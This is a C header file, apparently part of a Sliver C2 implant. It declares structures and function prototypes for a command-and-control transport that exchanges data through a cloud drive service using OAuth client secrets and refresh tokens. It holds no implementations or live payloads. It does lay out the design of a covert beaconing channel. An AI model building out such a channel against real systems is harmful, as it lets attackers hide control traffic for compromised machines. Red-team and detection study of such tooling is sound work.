#pragma once

typedef struct _DRIVE_CONFIG {
	LPSTR lpClientId;
	LPSTR lpClientSecret;
	LPSTR lpRefreshToken;
	LPSTR lpSendExtension;
	LPSTR lpRegisterExtension;
	LPSTR lpRecvExtension;
	LPSTR lpStartExtension;
} DRIVE_CONFIG, * PDRIVE_CONFIG;

struct _SLIVER_DRIVE_CLIENT {
	PHTTP_CONFIG pHttpConfig;
	PDRIVE_CONFIG* DriveList;
	DWORD dwNumberOfDriveConfigs;
	DWORD dwRecvCounter;
	DWORD dwSendCounter;
	DWORD dwPollInterval;
};

typedef enum {
	DriveStartOp,
	DrivePollOp,
	DriveSessionOp
} DriveOperation;

PSLIVER_DRIVE_CLIENT DriveInit();

BOOL DriveStart
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PSLIVER_DRIVE_CLIENT pDriveClient
);

BOOL DriveSend
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PSLIVER_DRIVE_CLIENT pDriveClient,
	_In_ PENVELOPE pEnvelope
);

PENVELOPE DriveRecv
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PSLIVER_DRIVE_CLIENT pDriveClient
);

BOOL DriveClose
(
	_In_ PSLIVER_BEACON_CLIENT pBeaconClient
);

BOOL RefreshAccessToken
(
	PSLIVER_DRIVE_CLIENT pDriveClient,
	PDRIVE_CONFIG pDriveConfig
);

LPSTR GetFileId
(
	_In_ PSLIVER_DRIVE_CLIENT pDriveClient,
	_In_ PDRIVE_CONFIG pDriveConfig,
	_In_ LPSTR* pSubStrings,
	_In_ DWORD cSubStrings
);

PBUFFER DriveDownload
(
	_In_ PSLIVER_DRIVE_CLIENT pDriveClient,
	_In_ LPSTR lpFileId
);

BOOL FreeDriveClient
(
	_In_ PSLIVER_DRIVE_CLIENT pBeaconClient
);